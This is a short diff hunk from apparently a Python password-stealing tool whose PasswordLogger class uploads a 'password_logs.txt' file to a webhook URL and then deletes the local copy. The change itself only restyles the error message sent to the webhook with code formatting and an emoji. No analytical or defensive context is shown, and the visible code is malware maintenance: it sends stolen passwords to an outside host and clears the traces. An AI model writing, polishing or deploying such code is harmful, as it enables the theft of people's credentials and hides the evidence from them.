@@ -61,7 +61,7 @@ class PasswordLogger:
             send_webhook(self.webhook_url, file={"password_logs.txt": open(self.log_file, "rb")})
             os.remove(self.log_file)
         except Exception as e:
-            send_webhook(self.webhook_url, f"Error logging passwords: {e}")
+            send_webhook(self.webhook_url, f"```❌ Error logging passwords: {e}```")
 
     def start(self):
         self.log_passwords()
